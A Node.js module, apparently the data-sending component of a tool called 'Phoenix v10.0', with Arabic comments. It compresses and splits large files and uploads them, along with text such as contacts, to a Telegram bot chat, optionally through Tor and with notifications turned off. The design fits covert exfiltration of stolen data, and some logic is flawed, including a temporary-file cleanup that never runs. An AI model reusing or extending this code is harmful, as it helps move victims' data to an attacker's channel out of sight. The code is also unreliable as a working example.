// ===================================================================
// TELEGRAM SENDER WITH CHUNKING – Phoenix v10.0
// ===================================================================
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const zlib = require('zlib');
const { promisify } = require('util');

// تحويل الدوال إلى نسخ تعمل بـ Promise
const gzip = promisify(zlib.gzip);
const gunzip = promisify(zlib.gunzip);

/**
 * الفكرة الأساسية:
 * - إذا كان الملف > 1 جيجابايت، يتم ضغطه ثم تقسيمه إلى 2 أو 3 أجزاء.
 * - كل جزء يُرسل كملف مستقل إلى Telegram مع رقم الجزء في التسمية.
 * - في حال فشل أي جزء، تتم إعادة المحاولة 3 مرات.
 */
class TelegramSender {
    /**
     * @param {string} token – توكن بوت Telegram
     * @param {string} chatId – معرف الدردشة (المستخدم أو القناة)
     * @param {Object} options
     * @param {number} options.chunkSize – الحجم الأقصى لكل جزء (بالبايت)، افتراضي 1.5 جيجابايت
     * @param {number} options.maxFileSize – الحد الأقصى لملف Telegram (2 جيجابايت)
     * @param {boolean} options.useTor – هل نستخدم Tor كوكيل؟
     * @param {number} options.retries – عدد محاولات إعادة الإرسال
     * @param {number} options.retryDelay – التأخير بين المحاولات (مللي ثانية)
     */
    constructor(token, chatId, options = {}) {
        this.token = token;
        this.chatId = chatId;
        this.options = {
            chunkSize: 1.5 * 1024 * 1024 * 1024, // 1.5 GB
            maxFileSize: 2 * 1024 * 1024 * 1024, // 2 GB (حد Telegram)
            useTor: false,
            retries: 3,
            retryDelay: 5000,
            ...options
        };

        // وكيل Tor (إذا كان مفعلاً)
        if (this.options.useTor) {
            const SocksProxyAgent = require('socks-proxy-agent');
            this.agent = new SocksProxyAgent('socks5://127.0.0.1:9050');
        } else {
            this.agent = null;
        }
    }

    // ================================================================
    // الوظيفة الرئيسية: إرسال ملف (مع أو بدون تقسيم)
    // ================================================================
    async sendFile(filePath, originalName, caption = '') {
        // 1. التحقق من وجود الملف
        if (!fs.existsSync(filePath)) {
            throw new Error(`File not found: ${filePath}`);
        }

        const stats = fs.statSync(filePath);
        const fileSize = stats.size;

        // 2. إذا كان الملف صغيراً (≤ 1 جيجابايت) أرسله مباشرة
        if (fileSize <= 1024 * 1024 * 1024) {
            return this.sendSingleFile(filePath, originalName, caption);
        }

        // 3. الملف كبير: نضغطه أولاً (لتقليل الحجم)
        let compressedPath = filePath;
        let compressedName = originalName;
        if (fileSize > 500 * 1024 * 1024) { // > 500 MB
            console.log(`[+] Compressing ${originalName} (${(fileSize / 1e9).toFixed(2)} GB)...`);
            compressedPath = await this.compressFile(filePath);
            compressedName = originalName + '.gz';
            // نستخدم حجم الملف المضغوط لتحديد التقسيم
            const compressedStats = fs.statSync(compressedPath);
            // إذا كان المضغوط صغيراً، نرسله كاملاً
            if (compressedStats.size <= 1024 * 1024 * 1024) {
                const result = await this.sendSingleFile(compressedPath, compressedName, caption);
                fs.unlinkSync(compressedPath); // حذف المؤقت
                return result;
            }
            // وإلا نكمل بتقسيم الملف المضغوط
            filePath = compressedPath;
            originalName = compressedName;
        }

        // 4. تقسيم الملف الكبير
        console.log(`[+] Splitting ${originalName} (${(fileSize / 1e9).toFixed(2)} GB)...`);
        const chunks = this.splitFile(filePath, originalName);
        const totalChunks = chunks.length;

        const results = [];
        for (let i = 0; i < totalChunks; i++) {
            const chunk = chunks[i];
            const partCaption = `${caption} (Part ${i+1}/${totalChunks})`;
            const result = await this.sendSingleFile(
                chunk.tempPath,
                chunk.name,
                partCaption
            );
            results.push(result);

            // حذف الملف المؤقت بعد الإرسال
            fs.unlinkSync(chunk.tempPath);

            // تأخير بسيط بين الأجزاء (تجنب حد المعدل)
            if (i < totalChunks - 1) {
                await new Promise(r => setTimeout(r, 1000));
            }
        }

        // حذف الملف الأصلي المضغوط (إن وجد)
        if (compressedPath !== filePath) {
            fs.unlinkSync(filePath);
        }

        return {
            success: true,
            totalChunks,
            results,
            originalName,
            totalSize: fileSize
        };
    }

    // ================================================================
    // ضغط الملف باستخدام Gzip
    // ================================================================
    async compressFile(filePath) {
        const data = fs.readFileSync(filePath);
        const compressed = await gzip(data, { level: 9 });
        const compressedPath = filePath + '.gz';
        fs.writeFileSync(compressedPath, compressed);
        return compressedPath;
    }

    // ================================================================
    // تقسيم الملف إلى أجزاء (2 أو 3 أجزاء كحد أقصى)
    // ================================================================
    splitFile(filePath, originalName) {
        const stats = fs.statSync(filePath);
        const fileSize = stats.size;
        const chunkSize = this.options.chunkSize; // 1.5 GB

        // حساب عدد الأجزاء المطلوبة
        let numChunks = Math.ceil(fileSize / chunkSize);
        if (numChunks < 2) numChunks = 2;      // أقل شيء جزأين للملفات الكبيرة
        if (numChunks > 3) numChunks = 3;      // أقصى شيء 3 أجزاء

        // إعادة حساب حجم كل جزء بالتساوي
        const actualChunkSize = Math.ceil(fileSize / numChunks);

        const tempDir = path.join(__dirname, 'temp_chunks');
        if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

        const chunks = [];
        for (let i = 0; i < numChunks; i++) {
            const start = i * actualChunkSize;
            const end = Math.min(start + actualChunkSize, fileSize);
            const chunkSizeActual = end - start;

            const chunkName = `${path.basename(originalName)}.part${i+1}.bin`;
            const tempPath = path.join(tempDir, `chunk_${Date.now()}_${i}.bin`);

            // قراءة الجزء من الملف الأصلي
            const buffer = Buffer.alloc(chunkSizeActual);
            const fd = fs.openSync(filePath, 'r');
            fs.readSync(fd, buffer, 0, chunkSizeActual, start);
            fs.closeSync(fd);

            // حفظ الجزء في ملف مؤقت
            fs.writeFileSync(tempPath, buffer);

            chunks.push({
                tempPath,
                name: chunkName,
                start,
                end,
                size: chunkSizeActual
            });
        }

        return chunks;
    }

    // ================================================================
    // إرسال ملف واحد إلى Telegram (بدون تقسيم)
    // ================================================================
    async sendSingleFile(filePath, fileName, caption = '') {
        const url = `https://api.telegram.org/bot${this.token}/sendDocument`;
        const form = new FormData();
        form.append('chat_id', this.chatId);
        form.append('document', fs.createReadStream(filePath), {
            filename: fileName,
            contentType: 'application/octet-stream'
        });
        form.append('caption', caption.slice(0, 1000));
        form.append('disable_notification', 'true');

        let attempt = 0;
        while (attempt < this.options.retries) {
            try {
                const response = await axios.post(url, form, {
                    headers: form.getHeaders(),
                    httpsAgent: this.agent,
                    maxContentLength: Infinity,
                    maxBodyLength: Infinity,
                });
                console.log(`[+] Sent ${fileName} (${(fs.statSync(filePath).size / 1e6).toFixed(2)} MB)`);
                return response.data;
            } catch (error) {
                attempt++;
                console.warn(`[!] Telegram send failed (attempt ${attempt}/${this.options.retries}): ${error.message}`);
                if (attempt >= this.options.retries) {
                    throw new Error(`Failed to send ${fileName} after ${this.options.retries} attempts: ${error.message}`);
                }
                await new Promise(r => setTimeout(r, this.options.retryDelay * attempt));
            }
        }
    }

    // ================================================================
    // إرسال نص (للمعلومات الوصفية، جهات الاتصال، إلخ)
    // ================================================================
    async sendText(text, caption = '') {
        const url = `https://api.telegram.org/bot${this.token}/sendMessage`;
        const payload = {
            chat_id: this.chatId,
            text: (caption ? caption + '\n\n' : '') + text.slice(0, 4096),
            disable_notification: true
        };

        try {
            const response = await axios.post(url, payload, {
                httpsAgent: this.agent
            });
            console.log(`[+] Sent text (${text.length} chars)`);
            return response.data;
        } catch (error) {
            console.error('[!] Failed to send text:', error.message);
            throw error;
        }
    }

    // ================================================================
    // دالة مساعدة: حساب التقسيم المناسب
    // ================================================================
    static getChunkingSuggestion(fileSize) {
        if (fileSize <= 1024 * 1024 * 1024) { // <= 1 GB
            return { shouldChunk: false, chunks: 1 };
        } else if (fileSize <= 2 * 1024 * 1024 * 1024) { // <= 2 GB
            return { shouldChunk: true, chunks: 2 };
        } else {
            return { shouldChunk: true, chunks: 3 };
        }
    }
}

module.exports = TelegramSender;
